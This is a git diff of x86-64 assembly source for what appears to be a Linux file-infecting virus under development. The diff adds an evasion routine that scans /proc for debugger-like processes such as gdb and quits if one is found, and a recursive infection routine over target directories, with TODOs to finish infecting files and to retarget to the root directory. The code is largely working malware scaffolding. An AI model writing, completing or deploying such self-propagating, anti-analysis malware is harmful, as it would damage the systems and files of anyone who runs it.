@@ -37,28 +37,26 @@ infected:
 mother:
 
 	; evasion routine
-    mov rdi, 0
-    call iterate_directory_moded
-    jmp exit_ok
-    ; open proc dir
+    call evasion_routine
+    
+    test rax, rax
+    jz exit_ok
+
+    ; infection routine
+    lea rdi, [rel root_dirs]
+    call infection_routine
+    jmp exit_err
     
 
-; Iterate directories with 2 modes.
-;
-; Input:
-;     RDI   = mode. 0 for evasion mode, 1 for infection mode 
-; Output:
-;     RAX   = status. For evasion mode, 1 will be returned if early close is required Else 0.
-;                     For infection mode, non zero will be returned if failure. 
-iterate_directory_moded:
+; evasion routine, this is run to detect if certain
+; processes are running by scanning the /proc/ directory
+; returns 0 if evasion is requried
+evasion_routine:
+    push rbx
     push rcx
     push r8
     push r9
-    cmp rdi, 0
-    je .evasion_mode
-    jne .infect_mode
 
-.evasion_mode:
     mov rax, SYS_OPEN
     lea rdi, [rel proc_dir]
     mov rsi, O_RDONLY | O_DIRECTORY
@@ -89,22 +87,83 @@ iterate_directory_moded:
     cmp rcx, rax
     jge .dirent_read_loop_end_evasion
 
-    ; print stuff
-    lea rdi, [rsp + rcx + dirent.d_name]
-    call write_string_nl
+    mov rbx, rsp ; og stack w/ dirent is now at rbx
+	push rax
 
-    ; TODO: allocate /proc/[dirent.d_name]/status in stack
+    ; allocate /proc/[dirent.d_name]/status in stack
     ; open and read. If error, continue
+    sub rsp, SIX_SEVEN
 
-    ; find needles in haystack. If found, set rax to 1 and
-    ; return
+    lea rsi, [rel proc_dir]
+    mov rdi, rsp
+    mov rdx, 6
+    call memcpy
+
+    ; rax contains addr already
+    lea rsi, [rbx + rcx + dirent.d_name]
+    mov rdi, rax
+    call strcpy
+
+    lea rsi, [rel proc_status]
+    mov rdi, rax
+    mov rdx, 8
+    call memcpy
+
+    ; ; print stuff
+    ; lea rdi, [rsp]
+    ; call write_string_nl
+
+    ; open 
+    mov rax, SYS_OPEN
+    lea rdi, [rsp]
+    mov rsi, O_RDONLY
+    xor rdx, rdx
+    push rcx
+    syscall
+    pop rcx
+
+    ; jmp to dirent_read_loop_start_evasion_end if err
+    test rax, rax
+    js .dirent_read_loop_start_evasion_end 
+
+    ; consume file name 
+    ; read first SIX_SEVEN bytes
+	sub rsp, SIX_SEVEN
+    mov rdi, rax
+    lea rsi, [rsp]
+    mov rdx, SIX_SEVEN - 1
+    mov rax, SYS_READ
+    push rcx
+    syscall
+    pop rcx
+    mov byte [rsp + rax], 0
+
+    ; strstr
+	lea rdi, [rsp]
+    lea rsi, [rel evade_proc]
+    push r8
+    push r9
+    call strstr
+    pop r9
+    pop r8
+    add rsp, SIX_SEVEN
+    test eax, eax
+    jz .dirent_read_loop_start_evasion_end
+    add rsp, SIX_SEVEN + DIRENT_BUF_SZ + 8 ; push rax from earlier
+    ; add rsp, DIRENT_BUF_SZ
+    ; add rsp, 8 ; why is this needed or else rsp will be 8 bytes off when return?
+    mov rax, 0
+    jmp .ret
+
+
+.dirent_read_loop_start_evasion_end:
+    add rsp, SIX_SEVEN
+    pop rax
 
 .dirent_read_loop_cont_evasion:
     movzx r8, word [rsp + rcx + dirent.d_reclen]
     add rcx, r8
     jmp .dirent_read_loop_start_evasion
-    
-
     
 .dirent_read_loop_end_evasion: 
     add rsp, DIRENT_BUF_SZ
@@ -114,27 +173,100 @@ iterate_directory_moded:
 .file_loop_end_evasion:
     add rsp, DIRENT_BUF_SZ
 
-
-
-.infect_mode:
-    jmp exit_err
-
+mov rax, 1
 .ret:
     pop r9
     pop r8
     pop rcx
+    pop rbx
     ret
-
-
 
     ; lea r8, [rel _end] ; end addr
     ; lea r9, [rel _start]; start addr
     ; sub r8, r9 ; r8 = end - start
 
 
-    xor rdi, rdi                        ; exit code 0
-    mov rax, SYS_EXIT                   ; exit
+    ; xor rdi, rdi                        ; exit code 0
+    ; mov rax, SYS_EXIT                   ; exit
+    ; syscall
+
+; input, rdi - a list of root directories
+infection_routine:
+    push rbx
+    push rcx
+    push r9
+
+; iterate through root folders
+.roots_iter:
+    push rdi
+
+
+    ; for each folder, iterate through all the entities
+    mov rax, SYS_OPEN
+    mov rsi, O_RDONLY | O_DIRECTORY
+    xor rdx, rdx
     syscall
+
+    ; save this fd
+    mov r9, rax
+
+    test rax, rax
+    js exit_err
+
+    call write_string_nl
+
+.file_loop_start_infection:
+    sub rsp, DIRENT_BUF_SZ
+    mov rdi, r9
+    mov rsi, rsp
+    mov rdx, DIRENT_BUF_SZ
+    mov rax, SYS_GETDENTS64
+    syscall
+
+    test rax, rax
+    js exit_err
+    jz .file_loop_end_infection
+
+; TODO: copy dirent_read_loop_start_evasion here
+
+
+.file_loop_end_infection:
+    add rsp, DIRENT_BUF_SZ
+
+    
+    pop rdi
+    call strlen
+    inc rax
+    add rdi, rax
+    call strlen
+    test rax, rax
+    jz .roots_iter_end
+    jmp .roots_iter
+
+.roots_iter_end:
+
+
+    ; ; load first addr
+    ; mov rbx, rdi
+    ; mov rdi, rbx
+    ; call write_string_nl
+
+    ; ; load 2nd addr
+    ; call strlen
+    ; inc rax
+    ; add rdi, rax
+    ; call write_string_nl
+    
+
+    ; if entity is a file, infect file
+
+    ; if entity is a folder, call infection_routine on that folder
+.ret:
+	pop r9
+    pop rcx
+    pop rbx
+    ret
+
 
 error_exit:
     mov rdi, 1                          ; exit code 1
@@ -165,22 +297,6 @@ strlen:
 .done:
     ret
 
-streq:
-.loop:
-    mov al, [rdi]
-    cmp al, [rsi]
-    jne .no
-    inc rdi
-    inc rsi
-    test al, al
-    jne .loop
-    xor eax, eax
-    ret
-
-.no:
-    mov eax, 1
-    ret
-
 write_string_nl:
     push rdi
     push rax
@@ -207,18 +323,77 @@ write_string_nl:
     pop rdi
     ret
 
+memcpy:
+    push rcx
+    mov rcx, rdx
+    rep movsb
+    mov rax, rdi
+    pop rcx
+    ret
+
+strcpy:
+    push    rcx
+    mov     rax, rdi
+
+.loop:
+    mov     cl, [rsi]
+    mov     [rdi], cl
+    inc     rsi
+    inc     rdi
+    test    cl, cl
+    jnz     .loop
+
+    mov     rax, rdi
+    dec     rax
+    pop     rcx
+    ret
+
+strstr:
+    cmp     byte [rsi], 0
+    je      .found
+
+.outer:
+    mov     r8, rdi
+    mov     r9, rsi
+
+.inner:
+    mov     al, [r9]
+    cmp     al, [r8]
+    jne     .next
+    inc     r9
+    inc     r8
+    cmp     byte [r9], 0
+    jne     .inner
+
+.found:
+    mov     eax, 1
+    ret
+
+.next:
+    inc     rdi
+    cmp     byte [rdi], 0
+    jne     .outer
+
+    xor     eax, eax
+    ret
+
+
+break:
+    ret
 ; -----------------------------------data-in-code-------------------------------
 
 dirent_buf times DIRENT_BUF_SZ db 0x0
 
 newline db `\n`
+slash db `/`
+null db 0
 
 ; TODO: change this to root 
 root_dirs db `/tmp/test`, 0, `/tmp/test2`,0,0
 excl_dir db `.`, 0, `..`, 0, 0
 
-proc_dir db `/proc`,0
-proc_status db `status`, 0
-evade_proc_n db `\tcat\n`, 0, `\tgdb\n`, 0, 0
+proc_dir db `/proc/`,0
+proc_status db `/status`, 0
+evade_proc db `\tcat\n`, 0
 
 _end:
